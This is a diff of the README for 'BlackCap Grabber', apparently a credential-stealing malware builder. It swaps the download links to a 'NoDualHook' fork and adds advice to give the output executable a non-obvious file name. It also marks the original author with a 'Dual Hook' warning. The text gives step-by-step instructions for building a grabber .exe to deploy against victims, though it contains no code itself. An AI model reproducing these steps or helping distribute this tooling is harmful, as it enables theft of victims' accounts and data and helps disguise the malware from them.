@@ -41,9 +41,9 @@ Love ❌ code ✅
 ## <a id="setup"></a> 📁 〢 Setting up BlackCap
 
 1. Install [Python](https://www.python.org/ftp/python/3.10.0/python-3.10.0-amd64.exe)
-2. Install [BlackCap Files](https://github.com/KSCHdsc/BlackCap-Grabber/archive/refs/heads/main.zip)
-3. Install all requirements [install.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/install.bat)
-4. Click on start.bat [start.bat](https://github.com/KSCHdsc/BlackCap-Grabber/blob/main/start.bat)
+2. Install [BlackCap Files](https://github.com/Inplex-sys/BlackCap-Grabber-NoDualHook/archive/refs/heads/main.zip)
+3. Install all requirements [install.bat](https://github.com/Inplex-sys/BlackCap-Grabber-NoDualHook/blob/main/install.bat)
+4. Click on start.bat [start.bat](https://github.com/Inplex-sys/BlackCap-Grabber-NoDualHook/blob/main/start.bat)
 5. Complete the configuration
 6. You have your .exe file enjoy :)
 
@@ -98,7 +98,7 @@ Love ❌ code ✅
 ```
 ![](https://media.discordapp.net/attachments/912038729626058853/1062467782446420049/image.png)
 ```d
-@blackcap: Here put your final file name like "blackcap_is_best" or "KSCH_the_Goat" 🤓
+@blackcap: Here put your final file name like who is not going to be obvious
 ```
 ![](https://media.discordapp.net/attachments/912038729626058853/1062468541967773756/image.png)
 ```d
@@ -215,12 +215,13 @@ v2.3.9: 2023-21-01
 
 
 ### Authors
-- [@KSCH](https://github.com/KSCHdsc)
 - [@HisSlot](https://github.com/HisSlot)
 - [@Sans](https://github.com/002-sans)
 - [@loTus](https://github.com/loTus04)
+- [@KSCH](https://github.com/KSCHdsc) ⚠️ Dual Hook ⚠️
 
 ### Contributors (CapingTeam)
+- Inplex-sys
 - Xenis
 - Nono1337
 - Irax212
